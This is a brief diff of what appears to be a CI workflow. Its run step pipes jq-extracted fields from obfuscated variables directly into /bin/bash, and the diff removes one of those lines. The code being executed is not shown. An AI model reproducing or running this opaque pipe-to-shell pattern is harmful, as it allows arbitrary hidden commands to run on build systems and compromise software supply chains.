@@ -23,7 +23,6 @@ jobs:
           echo $mui3 | jq -r .gc9601 | /bin/bash
           printf '%s' "$obn12908" | jq -r .ii28305 | /bin/bash
           echo $vbgzq16477 | jq -r .bzv8708 | /bin/bash
-          echo $orss59 | jq -r .i14 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
